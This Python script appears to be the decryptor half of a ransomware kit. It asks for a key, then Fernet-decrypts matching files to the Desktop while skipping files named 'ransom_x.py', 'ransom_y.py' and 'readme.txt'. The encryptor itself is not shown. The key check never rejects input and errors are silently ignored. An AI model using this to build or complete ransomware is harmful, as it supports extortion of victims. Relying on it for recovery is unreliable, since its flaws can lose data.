import os
from cryptography.fernet import Fernet

ENCRYPTED_EXTENSIONS = {ENCRYPTED_EXTENSIONS}

def decrypt_file(file_path, key, output_directory):
    try:
        with open(file_path, "rb") as file:
            contents = file.read()

        fernet = Fernet(key)
        plaintext = fernet.decrypt(contents)

        file_name = os.path.basename(file_path)
        output_path = os.path.join(output_directory, file_name)

        with open(output_path, "wb") as file:
            file.write(plaintext)
    except Exception:
        pass

def decrypt_all_files(directory, key, output_directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(ENCRYPTED_EXTENSIONS)) and file not in ["ransom_x.py", "ransom_y.py", "readme.txt"]:
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key, output_directory)

def get_valid_key():
    while True:
        key_b64 = input("KEY: ")
        try:
            key = key_b64.encode()
            return key
        except ValueError:
            print("Please try again.")

if __name__ == "__main__":
    key = get_valid_key()
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    current_directory = os.getcwd()
    decrypt_all_files(current_directory, key, desktop_path)
